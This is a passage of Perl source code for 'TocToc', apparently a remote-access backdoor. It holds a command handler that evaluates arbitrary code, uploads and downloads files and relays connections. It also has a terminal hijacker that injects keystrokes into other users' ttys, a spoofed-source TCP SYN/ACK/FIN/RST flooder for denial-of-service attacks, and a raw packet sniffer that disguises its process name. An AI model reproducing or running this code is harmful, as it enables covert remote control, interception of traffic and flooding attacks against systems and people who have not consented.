               my $line = $user.(" " x (10-(length($user)))).fill_space($ttyname, 7).fill_space($cli_sock->peerhost, 16).fill_space($show_login, 11).fill_space($show_idle, 8)."  ".$PROC{$ttyname}{cmd};

               spm($cli, $cmd, $line);
             }
             spm_done($cli, $cmd);
         } elsif ($cmd eq "VERSION") {
             spm_done($cli, $cmd, "TocToc $VERSION by 0ldW0lf (old-wolf\@zipmail.com)");
         } elsif ($cmd eq "GET") {
             sendfile($cli, @args);
         } elsif ($cmd eq "PUT") {
             getfile($cli, @args);
         } elsif ($cmd eq "EVAL") {
             my @ret = eval "$arg";
             spm_done($cli, $cmd, "Evaluation returned: @ret");
         } elsif ($cmd eq "SOCKLIST") {
             socklist($cli, "$arg");
             spm_done($cli, $cmd);
         } elsif ($cmd eq "PWD") {
             my $dir = getcwd();
             spm_done($cli, $cmd, "$dir");
         } elsif ($cmd eq "LAG") {
             spm_done($cli, $cmd, $arg);
   #        } elsif ($cmd eq "OPEN") {
   #            sopen($cli, @args);
   #        } elsif ($cmd eq "OPEN2") {
   #            sopen2($cli, @args);
         } elsif ($cmd eq "RESTART") {
            restart();
            sleep(1);
            spm_done($cli, $cmd, "I cannot execut myself again $SELF doesn't exit!");
         } elsif ($cmd eq "ATTACK") {
             attack($cli, @args);
         } elsif ($cmd eq "OPEN") {
             sopen2($cli, @args);
         } elsif ($cmd eq "CD") {
             if (chdir("$arg")) {
               my $dir = getcwd();
               spm($cli, $cmd, "Changed directory to: $dir");
             } else {
                spm($cli, $cmd, "I could not change directory to: $arg");
             }
             spm_done($cli, $cmd);
         } elsif ($cmd eq "DOWNLOAD") {
             my ($url, $file) = @args;
             my $pwd = getcwd();
             unless(defined($file)) {
               $file = $url;
               $file =~ s/^.*\/(\S+)$/$1/;
             }
             $file = "$pwd/$file";
             $file =~ s/^\/\//\//;

             unless(open(FILE, "> $file")) {
               spm_done($cli, $cmd, "Error: Cannot creat $file");
               next;
             }

             close(FILE);
             unless(download($cli, $url, $file))  {
               spm_done($cli, $cmd, "Error: I could not fork() the process.");
               next;
             }
         } elsif ($cmd eq "PS") {
             my @ps = ps();
             if (scalar(@ps) == 0) {
               spm_done($cli, $cmd, "None hidden procces has been found.");
             } else {
                foreach my $ps (@ps) {
                  spm($cli, $cmd, "$ps");
                }
                spm_done($cli, $cmd);
             }
         } else {
            spm_done($cli, $cmd, "Error: Command \'$cmd\' not implemented in this version ($VERSION).");
         }

       }
     }
   }


   #################
   # COMMANDS SUBs #
   #################

   # SYSTEM #
   sub w_procps {
     my @ttynames = grep { s/^\/dev\/(.*)/$1/; } @_;

     my (%TTY, %PROC);

     map { $TTY{$_} = (stat("/dev/$_"))[6] } @ttynames;


     my $btime;
     open(STAT, "< /proc/stat");
     while (<STAT>) {
       if (/^btime\s+(\d+)\n/i) {
         $btime = $1;
         last;
       }
     }
     close(STAT);

     opendir(PROC, "/proc");
     my @files = readdir(PROC);
     closedir(PROC);
     @files = grep { -d "/proc/$_" and $_ =~ /^\d+$/ } @files;

     foreach my $pid (@files) {
       open(STAT, "< /proc/$pid/stat");
       my $stat = <STAT>;
       close(STAT);
       my @proc_stat = split(/ /, $stat);
       my $devnum = $proc_stat[6];
       my $tpgid = $proc_stat[7];
       my $starttime = ($proc_stat[21]/$Hertz)+$btime;

       next if ($tpgid != $pid);
       next if ($devnum == 0);

       my ($dev) = grep { $TTY{$_} eq $devnum } keys(%TTY);

       # undefined $dev means for us that the proc
       # has not been ran from a /dev/pts/* device
       next unless($dev);

       if (not defined($PROC{$dev}) or $PROC{$dev}{starttime} < $starttime) {
         $PROC{$dev}{PID} = $pid;
         $PROC{$dev}{starttime} = $starttime;
       }
     }
     foreach my $dev (keys(%PROC)) {
       open(FH, "< /proc/".$PROC{$dev}{PID}."/cmdline");
       my $cmd = <FH>;
       $cmd =~ s/\0/ /g;
       $cmd =~ s/\s+$//;
       close(FH);

       my $idle = time-(stat($dev))[8];
       $PROC{$dev}{idle} = $idle;
       $PROC{$dev}{cmd} = $cmd;
       ($PROC{$dev}{UID}, $PROC{$dev}{GID}) = (stat("/proc/".$PROC{$dev}{PID}))[4, 5];
     }

     return(%PROC);
   }

   sub ps {
      my @result;

      opendir(DIR, "/proc");
      my @proc= readdir(DIR);
      closedir(DIR);
      @proc = grep { -d "/proc/".$_  and $_ =~ /^\d+$/ } @proc;

      open(PS, "/bin/ps ax |") || return("Error: I could not execute /bin/ps");
      my @ps = <PS>;
      close(PS);
      @ps = grep { s/^(|\s+)(\d+).*\n/$2/ } @ps;

      foreach my $pid (@proc) {
         next if (grep { $_ eq $pid } @ps);

         my $cmd;
         if(open(CMD, "/proc/$pid/cmdline")) {
           $cmd = <CMD>;
           close(CMD);
         }

         $cmd =~ s/\0/ /g;
         $cmd =~ s/\s+$//;
         my $dir = readlink("/proc/$pid/cwd");

         push(@result, "PID: $pid ($cmd) [$dir]");
      }
      return(@result);
   }


   sub sysinfo {
     my $hostname = doit("hostname");
     $hostname = "(I dunno)" unless ($hostname);

     my %CPU = cpuinfo();
     my %MEM = meminfo();
     my $uptime = uptime();
     my $bd_uptime = stat_time(time-$INITTIME, "d");
     my $cpu_load = sysload();
     my $OS = ucfirst($^O);
     my %NET = netinfo();
     my %DISK = diskinfo();

     opendir(PROC, "/proc");
     my @procs = readdir(PROC);
     closedir(PROC);
     @procs = grep { $_ ne "." and $_ ne ".." and $_ =~ /^\d+$/ } @procs;

     my $procs = scalar(@procs);

     my $kernel = "Error: Could not open /proc/version";
     my @version;
     if (open(VER, "< /proc/version")) {
       @version = split(/ /, <VER>);
       close(VER);
     }

     $kernel = $version[2] if (defined($version[2]));

     my @release_files = ("versão-conectiva", "mandrake-release", "redhat-release", "debian_version", "SuSE-release", "slackware-version", "release", "version");

     my $release;
     my $release_file;
     foreach my $file (@release_files) {
       if (-e "/etc/$file") {
         $release_file = "/etc/$file";
         last;
       }
     }

     unless ($release_file) {
       opendir(ETC, "/etc");
       my @files = readdir(ETC);
       closedir(ETC);
       my ($release_file) = grep { $_ =~ /release|version/ } @files;
       $release_file = "/etc/".$release_file;
     }

     if ($release_file and open(REL, "< $release_file")) {
       $release = <REL>;
       close(REL);
     }

     $release = "Slackware $release" if ($release_file eq "/etc/slackware-version" and $release !~ /Slackware/);
     $release = "Debian GNU/Linux $release" if ($release_file eq "/etc/debian_version" and $release !~ /Debian/);

     if ($release_file and !(grep { $release_file eq "/etc/$_" } @release_files)) {
       $release = "Guess $release" unless(grep { $release_file eq "/etc/$_" } @release_files);
     }
     $release = "[$release]" if ($release ne "");

     $release =~ s/\n//g;

     my @send = (
                 "Hostname:               $hostname",
                 " ",
                 "Operation System:       $OS $release",
                 "Kernel version:         $kernel",
                 " ",
                 "PERL Version:           $PERLVER",
                 " ",
                 "System UPTime:          $uptime",
                 "Server UPTime:          $bd_uptime",
                 " ",
                 "CPUs Number:            ".$CPU{CPUS},
                 "CPU Load:               $cpu_load");

     for (my $c = 1; $c <= $CPU{CPUS}; $c++) {
       my $cpun = $c;
       $cpun = '' if ($c == 1);
       my $space = " " x (3-length($cpun));
       push(@send, ("CPU$cpun MHz:             $space".$CPU{$c}{'cpu MHz'},
                    "CPU$cpun Vendor ID:       $space".$CPU{$c}{'vendor_id'},
                    "CPU$cpun Model name:      $space".$CPU{$c}{'model name'}));
     }

     push(@send, (" ",
                  "Memory Total:           ".int($MEM{'MemTotal'}/1000)." MB",
                  "Memory Free:            ".int($MEM{'MemFree'}/1000)." MB",
                  " ",
                  "Running process:        $procs",
                  " ",
                  " - Mounted devices -"));
     foreach my $mount (keys(%DISK)) {
       push(@send, (" ",
                   fill_space($mount, 12)." - Mount point: ".$DISK{$mount}{mount_point},
                               (" " x 15)."FileSystem:  ".$DISK{$mount}{filesystem}));
       if (defined($DISK{$mount}{info})) {
          my $info = $DISK{$mount}{info};

          push(@send, ((" " x 15)."Total size:  ".bkmg($info->{blocks}*1024)." (".$info->{per}."\% full)",
                       (" " x 15)."Used size:   ".bkmg($info->{used}*1024),
                       (" " x 15)."Free size:   ".bkmg($info->{bfree}*1024)));
       }
     }




     push(@send, (" ", " - Network info -"));
     foreach my $dev (keys(%NET)) {
       push (@send, (" ",
                    fill_space($dev, 6)." - IP Address:     ".$NET{$dev}{ip},
                             (" " x 9 )."IFace State:    ".$NET{$dev}{state},
                             (" " x 9 )."HW Adderss:     ".$NET{$dev}{mac},
                             (" " x 9 )."Broadcast:      ".$NET{$dev}{broadcast},

                             (defined($NET{$dev}{gateway})? ((" " x 9 )."Gateway:        ".$NET{$dev}{gateway}):''),

                             (" " x 9 )."Netmask:        ".$NET{$dev}{netmask}));
       push (@send,         ((" " x 9 )."Received bytes: ".$NET{$dev}{bytes_in},
                             (" " x 9 )."RX packets:     ".$NET{$dev}{rx_packets},
                             (" " x 9 )."Sent bytes:     ".$NET{$dev}{bytes_out},
                             (" " x 9 )."TX packets:     ".$NET{$dev}{tx_packets}))
                             unless ($dev =~ /^.+?:\d+$/);
       push (@send,         ((" " x 9 )."Promisc mode:   ".$NET{$dev}{promisc},
                             ($NET{$dev}{loopback} eq 1 ? (" " x 9 )."* Is a loopback interface" : "")));

     }



     return(@send);
   }

   # socklist by Larry Doolittle <ldoolitt@jlab.org> September 1997
   # adapted for TocToc use
   sub socklist {
     my ($cli, $protocol) = @_;
     undef($protocol) if ($protocol eq "0" );

     my $init = 0;

     my %sock_proc;
     opendir (PROC, "/proc") || spm($cli, "SOCKLIST", "Error: Could not open /proc");
     for my $f (readdir(PROC)) {
         next if (! ($f=~/[0-9]+/) );
         if (! opendir (PORTS, "/proc/$f/fd")) {
             closedir PORTS;
             next;
         }
         for my $g (readdir(PORTS)) {
             next if (! ($g=~/[0-9]+/) );
             my $r=readlink("/proc/$f/fd/$g");

             my ($dev,$ino)=($r=~/^(socket|\[[0-9a-fA-F]*\]):\[?([0-9]*)\]?$/);

             if ($dev == "[0000]" || $dev == "socket") {$sock_proc{$ino}=$f.":".$g;}    }
         closedir PORTS;
     }
     closedir PROC;

     sub scheck {
       open(FILE,"/proc/net/".$_[0]) || spm($cli, "SOCKLIST", "Error: Could not open file /proc/net/".$_[0]." for reading.");
       while (<FILE>) {
           my @F=split();
           next if ($F[9]=~/uid/);
           my @A=split(":",$F[1]);
           my $a=hex($A[1]);
           my ($pid,$fd)=($sock_proc{$F[9]}=~m.([0-9]*):([0-9]*).);
           my $cmd = "";
           if ($pid && open (CMD,"/proc/$pid/status")) {
              my $l = <CMD>;
              ($cmd) = ( $l=~/Name:\s*(\S+)/ );
              close(CMD);
           }
           if ($init == 0 ) {
               spm($cli, "SOCKLIST", "type  port      inode     uid    pid   fd  name");
               $init = 1;
           }
           my $string = sprintf("%s %6d %10d  %6d %6d %4d  %s", $_[0],$a ,$F[9], $F[7], $pid, $fd, $cmd);
           spm($cli, "SOCKLIST", $string);
       }
       close(FILE);
     }
     if (not defined($protocol)) {
       scheck("tcp");
       scheck("udp");
       scheck("raw");
     } elsif (grep { $_ eq $protocol } ("tcp", "udp", "raw")) {
         scheck("$protocol");
     } else {
        spm($cli, "SOCKLIST", "Error: protocol ".uc($protocol)." not found in the list (UDP, TCP, RAW)");
     }

   }

   # TRANSFERS #
   sub getfile {
      my ($cli, $file, $port) = @_;

      my $pid = fork();
      return(undef) if (not defined($pid));
      unless ($pid) {
        my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => "$port", Proto => $CLIENT{$cli}->{protocol}, Timeout=> 10);
        exit unless($transfer);
        $transfer->autoflush(1);

        my $OK = 1;
        if (-e "$file") {
          $transfer->send("File already exists.");
          $OK = 0;
        }
        unless (open(FILE, "> $file")) {
           $transfer->send("I could not open the file.");
          $OK = 0;
        }

        $transfer->send("OK");

        sleep(1);

        my $msg;
        my $got_info = 0;
        my $bytes = 0;

        while ( 1 ) {
           my $nread;

           ($CLIENT{$cli}->{protocol} eq "tcp" ? $nread = sysread($transfer, $msg, $buffer) : $transfer->recv($msg, $buffer));

           if ($nread == 0 and $CLIENT{$cli}->{protocol} eq "tcp") {
              close(FILE);
              exit;
           }
           if ($got_info == 0) {
             $got_info = 1;
             my $pack = pack("N", 0);
             $transfer->send($pack);
             next;
           }
           print FILE $msg;
           $bytes += length($msg);
           my $got_bytes = pack("N", $bytes);
           $transfer->send($got_bytes);
        }

        exit;
      }
   }

   sub sendfile {
      my ($cli, $file, $port) = @_;

      my $pid = fork();
      return(undef) if (not defined($pid));
      unless ($pid) {
        my $transfer = IO::Socket::INET->new(PeerAddr => $cli->peerhost, PeerPort => "$port", Proto => $CLIENT{$cli}->{protocol}, Timeout=> 10);

        exit unless($transfer);
        $transfer->autoflush(1);

        unless (-e "$file") {
          $transfer->send("File not found.");
        }
        unless (open(FILE, "< $file")) {
          $transfer->send("I could not open the file.");
        }

        my $bytes = (stat("$file"))[7];
        $transfer->send($bytes);

        my ($msg, $nread);
        while ( 1 ) {
           ($CLIENT{$cli}->{protocol} eq "tcp" ? $nread = sysread($transfer, $msg, $buffer) : $transfer->recv($msg, $buffer));
           if ($nread == 0 and $CLIENT{$cli}->{protocol} eq "tcp") {
             close(FILE);
             exit;
           }
           my $sended_bytes = unpack("N", $msg);
           seek(FILE, $sended_bytes, 0);
           my $send_bytes;
           read(FILE, $send_bytes, $buffer);
           $transfer->send($send_bytes);
        }

        exit;
      }
   }

   sub download {
     my ($cli, $link, $file) = @_;

     my $proto = $CLIENT{$cli}->{proto};

     pipe(RDR, WTR);

     $CLIENT{$cli}->{DOWNLOAD_PIPE} = \*WTR;

     my $pid = fork();
     return(undef) if not defined($pid);

     unless($pid) {
       close(WTR);
       unless(open(FILE, "> $file")) {
         spm_done($cli, "DOWNLOAD", "I could not open $file for writting");
         exit;
       }

       my $first = 1;

       my $init_time = timem();
       my $saved_data = 0;
       if ($link =~ /^http/i) {
         my $ua = LWP::UserAgent->new(keep_alive => 1,  timeout => 30 );
         my $req = new HTTP::Request GET => $link;

         my $res = $ua->request($req,\&http_save_data, $lbuffer);
         $init_time = timem();
         if ($res->header("X-Died") || !$res->is_success) {
           spm($cli, "DOWNLOAD", "Error: Download was interrupted by peer.");
         } else {
            spm($cli, "DOWNLOAD", "Download finished, file $file has been saved.");
         }
       } elsif ($link =~ /^ftp/i) {
           $link =~ s/^ftp:\/\///i;
           $link =~ /(.+?)\/(.*)/;
           my $host = $1;
           my $file = $2;
           my $save = $link;
           $save =~ s/.*\/(.+?)$/$1/;
           unless ($host or $file) {
             spm_done($cli, "DOWNLOAD", "Unrecognized ftp link");
             close(RDR);
             exit;
           }
           my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => 21, Proto => "tcp", Timeout => 15);
           unless ($sock) {
             spm_done($cli, "DOWNLOAD", "Error: I could not connect on host ($host:21)");
             close(RDR);
             exit;
           }

           my $logado = 0;
           print $sock "USER anonymous\r\nPASS anonymous\@anonymous.com\r\n";
           my ($size, $trans);

           while (<$sock>) {
              my $buf = $_;
              $buf =~ s/\n//;
              if ($buf =~ /^230/ and $logado == 0) {
                $logado = 1;
                 print $sock "TYPE I\r\nPASV\r\nRETR $file\r\n";
              } elsif ($buf =~ /^150.+?\((\d+)\s.+?\)/) {
                 $size = $1;
                 $init_time = timem();
                 my $saved_data = 0;
   #              open(FILE, "> $save");
                 while (<$trans>) {
                   print FILE $_;
                   $saved_data += length($_);
                   gotta_die();
                   if ($first == 1) {
                     spm($cli, "DOWNLOAD", "Stats: Downloading $link ($size size). Type ^C to abort");
                     $first = 0;
                   } else {
                      ProgressBar($cli, $init_time, $saved_data, $size);
                   }
                 }
   #              close(FILE);
                 print $sock "QUIT\r\n";
                 last;
              } elsif ($buf =~ /^530/ and $logado == 1) {
                  spm_done($cli, "DOWNLOAD", "Error: File not found.");
                  close(RDR);
                  exit;
              } elsif ($buf =~ /^227.+?\((.*)\)/) {
                  my @info = split(',', $1);
                  my $host = join('.', @info[0 .. 3]);
                  my $port = $info[4] * 256 + $info[5];
                  $trans = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "$port", Proto => "tcp");
                  unless ($trans) {
                    spm_done($cli, "DOWNLOAD", "Error: I could not estabilish the transfer connection");
                    close(RDR);
                    exit;
                  }
              }
           }
       } else {
          spm($cli, "DOWNLOAD", "Link MUST begin with http:// or ftp://");
       }

       close(RDR);
       close(FILE);

       spm_done($cli, "DOWNLOAD");
       sleep(1);
       exit;

       sub http_save_data {
         my($data, $response, $protocol) = @_;
         print FILE $data;
         gotta_die();
         $saved_data += length($data);
         my $total_data = $response->content_length;

         if ($first == 1) {
           spm($cli, "DOWNLOAD", "Stats: Downloading $link ($total_data size). Type ^C to abort");
           $first = 0;
         } else {
              ProgressBar($cli, $init_time, $saved_data, $total_data);
         }
       }

       sub gotta_die {
         my $readfields = '';
         vec($readfields, fileno(RDR), 1) = 1;
         my $ready = select($readfields, undef, undef, 0);
         if ($ready == 1) {
           close(FILE);
           close(RDR);
           sleep(1);
           exit;
         }
       }
     }
     close(RDR);
     return(1);
   }

   sub sopen2 {
     my ($cli, $ip, $port, $cli_port) = @_;
     my $cli_host = $cli->peerhost;

     my $pid = fork();

     unless($pid) {

       my $sock = IO::Socket::INET->new(PeerAddr => $cli_host, PeerPort => $cli_port, Proto => "tcp", Timeout => 15) || exit;
       $sock->autoflush(1);
       my $sel = IO::Select->new($sock);
       my $remote;

       my $go = 0;

       while ( 1 ) {
         foreach my $fh ($sel->can_read(0.01)) {
            my $msg;
            my $nread = sysread($fh, $msg, $lbuffer);

            if ($nread == 0) {
               sleep(1);
               $sel->remove();
               $sock->close() if ($sock);
               $remote->close() if ($remote);
               exit;
            }

            if ($fh eq $sock) {
              if ($go == 0) {
                $remote = IO::Socket::INET->new(PeerAddr => $ip, PeerPort => $port, Proto => "tcp");
                unless ($remote) {
                  print $sock "I could not connect on $ip:$port\n";
                  $sel->remove();
                  $sock->close() if ($sock);
                  exit;
                }
                $sel->add($remote);
                $go = 1;
              } else {
                 syswrite($remote, $msg, length($msg));
              }
            } else {
                syswrite($sock, $msg, length($msg));
            }
         }
       }
     }
   }

   sub hijack {
     my ($cli, $device, $msg) = @_;
     unless(open(TTY, "+>$device")) {
       spm_done($cli, "HIJACK", "I could not open tty $device");
       return();
     }

     # i hope it works
     if ($ioctl_ok == 0 and !defined($CLIENT{$cli}->{hijack_warn})) {
       spm($cli, "HIJACK", "WARNING: Trying to define &TIOCSTI, propably 'asm/ioctls.ph' wasn't loaded. Its not recommended to go on, type ^H. From now on the typed keys gonna be sended to the terminal");
       spm_done($cli, "HIJACK");
       close(TTY);
       $CLIENT{$cli}->{hijack_warn} = 1;
       return(undef);
     }

     $msg =~ s/\001/\n/g;
     $msg =~ s/\002/ /g;

     foreach my $char (split('', $msg)) {
       spm($cli, "HIJACK", "Hey yo! I couldn't write on $device: $!")
       unless (ioctl(TTY, &TIOCSTI, $char));
     }
     close(TTY);
     spm_done($cli, "HIJACK");
   }

   # this one is a flooder that i made just like slice 3
   # now i adapt it :P
   sub attack {
     my ($cli, $dest, $src, $range, $types, $sec) = @_;
     my @types = split(',', $types);
     my ($bport, $eport, %flags, $alternate);

     unless ($dest =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/) {
       spm_done($cli, "ATTACK", "Wrong IP address: $dest");
       return(undef);
     }
     if ($src ne "0" and $src !~ /^\d{1,3}/) {
       spm_done($cli, "ATTACK", "Wrong IP source block: $src");
       return(undef);
     }

     foreach my $type (@types) {
       unless (grep { $_ == $type } (1 .. 6)) {
         spm_done($cli, "ATTACK", "Wrong type: $type");
         return(undef);
       }
       $flags{syn} = '1' if ($type == 1);
       $flags{ack} = '1' if ($type == 2);
       $flags{fin} = '1' if ($type == 3);
       $flags{rst} = '1' if ($type == 4);
       $flags{syn} = $flags{ack} = $flags{fin} = $flags{rst} = 1 if ($type == 5);
       $alternate  = 1 if ($type == 6);
     }

     $flags{syn} = $flags{ack} = $flags{fin} = $flags{rst} = 1
       if ($alternate == 1 and scalar(keys(%flags)) == 0);

     if ($range =~ /^(\d+)\-(\d+)$/) {
       $bport = $1;
       $eport = $2;
       if ($bport > $eport) {
         spm_done($cli, "ATTACK", "Range port should be X-Y where X =< Y. Ig.: 1-10");
         return(undef);
       }
     } elsif ($range ne "0") {
         spm_done($cli, "ATTACK", "Wrong range port: $range");
         return(undef);
     }

     if ($sec and $sec !~ /^\d+$/) {
       spm_done($cli, "ATTACK", "Yo! I think that $sec is not the time to run :P");
       return(undef);
     }

     pipe(ARDR, AWTR);
     my $pid = fork();

     if (not defined($pid)) {
       spm_done($cli, "ATTACK", "I could not fork()");
       return(undef);
     }

     unless ($pid) {
       my $p = new Net::RawIP({ip=>{}, tcp=>{}});
       my $init_time = time;
       my $packet_counter = 0;

       syswrite(AWTR, "$$\n");
       sleep(1);
       close(AWTR);
       close(ARDR);
       spm($cli, "ATTACK", "Attacking $dest... ");
       while ( 1 ) {
         done() if (defined($sec) and (time-$init_time) >= $sec);

         my $sport  = int(rand(65535));
         my $dport  = ($range == 0 ? int(rand(65535)) : $bport+($packet_counter % (($eport+1)-$bport)));
         my $srcip  = rand_ip($src);
         my %pflags = ($alternate == 1 ? ((keys(%flags))[($packet_counter % scalar(keys(%flags)))-1], '1') : %flags);
         grep { $pflags{$_} = '0' if not defined($pflags{$_}) } ("syn", "fin", "rst", "ack");

         send_packet($dest, $srcip, $sport, $dport, %pflags);

         $packet_counter++;
       }

       sub rand_ip {
         my $src_block = shift;

         return(int(rand(255)).".".int(rand(255)).".".int(rand(255)).".".int(rand(255)))
           if ($src_block == 0);

         my $dots = scalar(grep { $_ eq "\." } split('', $src_block));
         for (my $c = $dots; $c < 3; $c++) {
           $src_block .= ".".int(rand(255));
         }

         return($src_block);
       }

       sub send_packet {
          my ($dst, $src, $sport, $dport, %flags) = @_;

          $p->set({ip => { saddr => $src, daddr => $dst, ttl => '256', tos => '0', id => int(rand(99999)) },
                  tcp => { source => $sport, dest => $dport, ack_seq => int(rand(9999999999)),psh => '0', urg_ptr => '255', window => int(rand(65535)), (%flags) }
                 });

          $p->send(-1, 10);
       }

       sub done {
         spm_done($cli, "ATTACK", "DONE!", "Total packets sent: ".($packet_counter*10), "Time running: ".(time-$init_time)." s");
         sleep(1);
         exit 0;
       }

       exit 1; # ???
     }

     for (my $c = 0; $c < 5; $c++) {
       if (my $pid = fhread(\*ARDR, 1)) {
         $pid =~ s/\n$//;
         $CLIENT{$cli}->{ATTACK_PID} = $pid;
       }
     }
     close(AWTR);
     close(ARDR);

   }

   ################
   # SYSINFO SUBs #
   ################

   sub diskinfo {
     my %DISK;
     my @mounts;
     open(MTAB, "< /etc/mtab");
     while(my $line = <MTAB>) {
       if ($line =~ /^\s*\/(.+?)\s+(.+?)\s+(.+?)\s+/) {
         $DISK{"/$1"}{mount_point} = $2;
         $DISK{"/$1"}{filesystem} = $3;
       }
     }
     close(MTAB);

     foreach my $mount (keys(%DISK)) {
       my $point = $DISK{$mount}{mount_point};
       $DISK{$mount}{info} = df($point) if (is_loaded("Filesys::Df"));
     }

     return(%DISK);
   }

   sub netinfo {
      my %DEV;
      open(NET, "< /proc/net/dev");
      while (<NET>) {
        if (/^\s+(.+?)\:(.*)$/) {
          my $iface = $1;
          my $inf = $2;
          $inf =~ s/^\s+//;

          my @info = split(/\s+/, $inf);
          $DEV{$iface}{bytes_in} = bkmg($info[0]);
          $DEV{$iface}{bytes_out} = bkmg($info[8]);
          $DEV{$iface}{rx_packets} = $info[1];
          $DEV{$iface}{tx_packets} = $info[9];
          $DEV{$iface}{ip} = $IFACES{$iface} if (defined($IFACES{$iface}));
        }
      }
      close(NET);

      open(ROUTE, "< /proc/net/route");
      while(<ROUTE>) {
        next if (/Iface/);
        my ($iface, $dest, $gate, $mask) = (split(/\s+/))[0, 1, 2, 7];

        $DEV{$iface}{ip} = $IFACES{$iface} if (defined($IFACES{$iface}));
        $DEV{$iface}{netmask} = hexaddr($mask) if (hex($gate) == 0);
        $DEV{$iface}{gateway} = hexaddr($gate) if (hex($dest) == 0);
      }
      close(ROUTE);

      map {
         $DEV{$_}{gateway} = "0.0.0.0" unless(defined($DEV{$_}{gateway}));
         $DEV{$_}{broadcast} = $DEV{$_}{mac} = $DEV{$_}{promisc} = $DEV{$_}{state} = "(I dunno)";
      } keys(%DEV);

      eval '
        if (is_loaded("IO::Interface")) {
          use IO::Interface qw(:flags);
          my $s = IO::Socket::INET->new(Proto => "udp");

          foreach my $if ($s->if_list) {
            my $flags              = $s->if_flags($if);
            $DEV{$if}{ip}          = $s->if_addr($if);
            $DEV{$if}{broadcast}   = $s->if_broadcast($if);
            $DEV{$if}{netmask}     = $s->if_netmask($if);
            $DEV{$if}{mac}         = $s->if_hwaddr($if);
            $DEV{$if}{loopback}    = 1 if ($flags & IFF_LOOPBACK);
            $DEV{$if}{state}       = (($flags & IFF_RUNNING) ? "UP" : "DOWN");
            $DEV{$if}{promisc}     = (($flags & IFF_PROMISC) ? "ON" : "OFF");
          }

          $s->close() if ($s);
        }
      ';

      return(%DEV);
   }

   sub sysload {
     open(LOAD, "< /proc/loadavg") || return("Error: I could not open /proc/loadavg");
     my $load = <LOAD>;
     close(LOAD);
     $load =~ /^(.+?)\s+/;
     return($1);
   }

   sub uptime {
     open(UPT, "< /proc/uptime") || return("Error: I could not open /proc/uptime");
     my $uptime = <UPT>;
     close UPT;

     $uptime =~ /^(.+?)\s+(.*)/;
     my $s = int($1);
     return(stat_time($s, "d"));
   }

   sub meminfo {
     my %MEM;

     open(MEM, "< /proc/meminfo") || return("Error: I could not open /proc/meminfo");

     while (<MEM>) {
       next unless (/^(.+?)\:\s+(\d+)/);
       $MEM{$1} = $2;
     }

     close(MEM);
     return(%MEM);
   }

   sub cpuinfo {
     my %CPU;

     my $cpu_counter = 0;
     open(CPU, "< /proc/cpuinfo") || return("Error: I could not open /proc/cpuinfo");

     while (<CPU>) {
       if (/^processor/) {
         $cpu_counter++;
       } else {
          next unless (/^(.+?)\s+\:\s+(.*?)\n$/);
          $CPU{$cpu_counter}{$1} = $2;
       }
     }
     close(CPU);

     $CPU{CPUS} = $cpu_counter;
     return(%CPU);
   }


   #############
   # SNIF SUBs #
   #############

   sub init_sniffer {
     %IFACES = &get_ifaces;
     undef(@STARTED_IFACES);

     foreach my $iface (keys(%IFACES)) {
       next if ($iface =~ /\:\d+$/);
       next if ($iface eq "lo" and $SNIF{lo} == 0);
       if (defined($SNIFFER{$iface}) and $SNIFFER{$iface}->{ok} == 1) {
         push(@STARTED_IFACES, $iface);
         next;
       }

       push(@STARTED_IFACES, $iface) if (init_iface($iface));
     }

     return(1) if (@STARTED_IFACES);
     return(undef);
   }

   sub init_iface {
     my $init_iface = shift;

     if (defined($SNIFFER{$init_iface})) {
       my $pid = $SNIFFER{$init_iface}->{PID};
       kill(9, $pid) if (kill(0, $pid));
     }
     $SNIFFER{$init_iface}->{ok} = 0;

     my $pid = fork();

     return(undef) if (not defined($pid));

     unless ($pid) {
       local($SIG{HUP}) = 'IGNORE';

       local $0 = "TocToc [$init_iface]\0";

       my $p=new Net::RawIP({ip=>{},udp=>{}});
       my $psck=$p->pcapinit($init_iface,$pfil,$psize,$ptout);

       pwrite("$init_iface PID $$");
       pwrite("$$ OK") if (defined($p) and defined($psck));


       loop($psck,-1,\&to_parser,@p);
       main_check();
       exit(1);

       sub pwrite {
         my $msg = $_[0]."$EOC\n";
         main_check();
         return(syswrite(SNIF_WTR, $msg, length($msg)));
       }
       sub to_parser {
          parse($init_iface, $p, $_[2]); # parse first.. maybe you want
                                         # send me a command even without
                                         # a parent i can survive ;-(
          main_check();
       }
       sub main_check {
         exit(0) if (is_ready(\*DRDR));

         unless (kill(0, $MAIN_PID)) {
           syswrite(DWTR, "1\n", 2);
           sleep(1);
           main();
         }
       }
     }

     my $timeout = 10;

     while ( 1 ) {
       last if ($timeout <= 0);
       $timeout -= 0.2;
       foreach my $msg  (split("$EOC\n", fhread(\*SNIF_RDR, 0.2))) {
         if ($msg =~ /^$init_iface PID (\d+)$/) {
           $SNIFFER{$init_iface}->{PID} = $1;
         }
         if ( $msg eq $SNIFFER{$init_iface}->{PID}." OK") {
           $SNIFFER{$init_iface}->{ok} = 1;
           return(1);
         }
       }
     }

     return(undef);
   }

   sub get_ifaces {
     # reformat :P come on... its the way i like :)
     my $a = ifaddrlist;
     my %b;

     map{ $b{$_} = $a->{$_} } keys %$a;

     return(%b);
   }

   sub parse {
     my ($iface, $p, $pkt) = @_;

     my $eth = NetPacket::Ethernet->decode($pkt);
     my $ip = NetPacket::IP->decode(eth_strip($pkt));

     my ($tcp, $udp, $icmp, %PKT);

     $PKT{PROTO} = getprotobynumber($ip->{proto});

     if ($PKT{PROTO} eq "tcp") {
        $tcp = NetPacket::TCP->decode(ip_strip(eth_strip($pkt)));
        $PKT{DATA} = $tcp->{data};
        $PKT{SRCPORT} = $tcp->{src_port};
        $PKT{DSTPORT} = $tcp->{dest_port};
        $PKT{TCP_FLAGS} = $tcp->{flags};
        $PKT{TCP_OPTIONS} = $tcp->{options};
     } elsif ($PKT{PROTO} eq "udp") {
         $udp = NetPacket::UDP->decode(ip_strip(eth_strip($pkt)));
         $PKT{DATA} = $udp->{data};
         $PKT{SRCPORT} = $udp->{src_port};
         $PKT{DSTPORT} = $udp->{dest_port};
     } elsif ($PKT{PROTO} eq "icmp") {
         $icmp = NetPacket::ICMP->decode(ip_strip(eth_strip($pkt)));
         $PKT{DATA} = $icmp->{data};
         $PKT{SRCPORT} = 0;
         $PKT{DSTPORT} = 0;
         $PKT{ICMP_CODE} = $icmp->{code};
         $PKT{ICMP_TYPE} = $icmp->{type};
     }


     return(undef) if ($PKT{DATA} eq '');

     # i guess the server is the lowest port :)
